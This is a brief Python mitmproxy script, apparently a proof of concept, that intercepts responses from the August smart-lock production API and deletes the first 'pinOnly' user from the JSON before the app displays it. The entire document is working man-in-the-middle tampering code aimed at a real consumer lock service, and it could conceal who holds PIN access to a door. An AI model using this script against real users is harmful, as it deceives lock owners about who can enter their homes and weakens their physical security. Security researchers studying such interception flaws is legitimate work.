"""
This script deletes the first user with "pin access" to the lock
"""

from mitmproxy import http, ctx
import json

def response(flow: http.HTTPFlow) -> None:

    if "api-production.august.com" in flow.request.pretty_host:
        data = json.loads(flow.response.content)
        del data['pinOnly'][0]
        flow.response.content = bytes(json.dumps(data), 'utf-8')

